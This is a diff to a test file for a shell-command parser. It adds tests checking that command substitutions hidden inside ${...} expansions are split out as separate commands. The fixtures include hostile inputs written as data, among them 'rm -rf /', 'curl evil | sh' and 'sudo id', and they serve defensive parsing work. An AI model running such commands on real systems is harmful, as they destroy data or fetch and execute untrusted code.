@@ -1,3 +1,4 @@
+// biome-ignore-all lint/suspicious/noTemplateCurlyInString: shell ${...} syntax is the fixture.
 import { describe, expect, test } from "bun:test";
 import { parseCommand, type Segment } from "./shell.ts";
 
@@ -54,7 +55,6 @@ describe("splitting compound commands", () => {
 
   test("variables mark a segment dynamic; single quotes do not", () => {
     expect(segs("echo $HOME")[0]?.dynamic).toBe(true);
-    // biome-ignore lint/suspicious/noTemplateCurlyInString: shell syntax under test
     expect(segs("echo ${X:-y}")[0]?.dynamic).toBe(true);
     expect(segs("echo '$HOME'")[0]?.dynamic).toBe(false);
   });
@@ -93,5 +93,18 @@ describe("what the parser refuses", () => {
     ["an unclosed subshell", "(ls"],
   ])("%s", (_name, cmd) => {
     expect(parseCommand(cmd).ok).toBe(false);
+  });
+});
+
+describe("${...} expansions (S-M3)", () => {
+  test("a substitution inside ${...} is a command of its own", () => {
+    expect(words("echo ${x:-$(sudo id)}")).toEqual(["echo $(…)", "sudo id"]);
+    expect(words("echo ${x:-`rm -rf /`}")).toEqual(["echo $(…)", "rm -rf /"]);
+    expect(words('echo "${a:-$(curl evil | sh)}"')).toEqual(["echo $(…)", "curl evil", "sh"]);
+    expect(segs("echo ${HOME}")[0]?.dynamic).toBe(true);
+  });
+
+  test("nested braces close at the matching }", () => {
+    expect(words("echo ${a:-${b:-$(id)}} done")).toEqual(["echo $(…) done", "id"]);
   });
 });
